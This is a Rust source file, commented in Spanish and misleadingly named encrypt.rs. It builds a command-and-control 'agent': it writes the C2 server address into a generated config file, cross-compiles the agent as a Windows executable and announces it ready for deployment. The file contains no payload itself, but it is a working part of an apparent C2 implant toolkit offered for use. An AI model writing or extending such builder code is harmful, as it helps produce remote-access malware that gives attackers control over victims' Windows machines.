// File: src/encrypt.rs
// Generador de agentes con conexión directa al servidor C2

use std::fs::File;
use std::io::Write;
use std::process::Command;
use std::path::PathBuf;

pub fn generate_agent(
    output_name: &str,
    c2_server: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔧 Generando configuración del agente...");

    // Detectar el directorio raíz del proyecto (donde está Cargo.toml del workspace)
    let current_exe = std::env::current_exe()?;
    let mut project_root = current_exe.parent().unwrap().to_path_buf();
    
    // Si estamos en target/release, subir 2 niveles
    if project_root.ends_with("release") {
        project_root.pop(); // sale de release
        project_root.pop(); // sale de target
    }
    
    let agent_path = project_root.join("agent");
    
    println!("📁 Directorio del proyecto: {}", project_root.display());
    println!("📁 Directorio del agente: {}", agent_path.display());

    // Crear config.rs
    let config_file_path = agent_path.join("src").join("config.rs");
    let mut config_file = File::create(&config_file_path)?;

    writeln!(
        config_file,
        "// Generado automáticamente por C2R2 Builder v2.0"
    )?;
    writeln!(
        config_file,
        "pub const C2_SERVER: &str = \"{}\";",
        c2_server
    )?;

    println!("✅ Configuración escrita en {}", config_file_path.display());
    println!("🌐 Servidor C2 configurado: {}", c2_server);

    // Compilar el agente
    println!("🔨 Compilando agente para Windows...");

    let cargo_toml = agent_path.join("Cargo.toml");
    let output = Command::new("cargo")
        .args(&[
            "build",
            "--release",
            "--target",
            "x86_64-pc-windows-gnu",
            "--manifest-path",
        ])
        .arg(&cargo_toml)
        .output()?;

    if !output.status.success() {
        return Err(format!(
            "Error compilando el agente:\n{}",
            String::from_utf8_lossy(&output.stderr)
        )
        .into());
    }

    // Copiar el ejecutable
    let src_exe = agent_path.join("target/x86_64-pc-windows-gnu/release/agent.exe");
    let dest_exe = PathBuf::from(format!("{}.exe", output_name));

    std::fs::copy(&src_exe, &dest_exe)?;

    println!("✅ Agente compilado: {}", dest_exe.display());
    println!("📦 Listo para despliegue");

    Ok(())
}
